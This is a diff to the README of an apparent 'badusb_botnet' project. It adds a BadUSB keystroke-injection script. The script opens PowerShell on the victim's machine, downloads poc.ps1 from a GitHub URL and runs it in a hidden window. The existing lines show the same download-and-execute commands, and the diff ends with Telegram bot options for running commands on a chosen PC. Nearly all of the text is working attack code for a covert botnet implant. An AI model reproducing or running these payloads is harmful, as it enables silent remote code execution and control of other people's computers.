@@ -5,6 +5,23 @@
 > (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
 > powershell.exe -windowstyle hidden -file poc.ps1
 ```
+
+```
+DELAY 3000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 750
+STRING (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
+DELAY 500
+ENTER
+STRING powershell.exe -windowstyle hidden -file poc.ps1
+DELAY 500
+ENTER
+```
+
 #### Telegram Options
 
 - /select ```IP``` ```command``` (Execute a command in a PC)
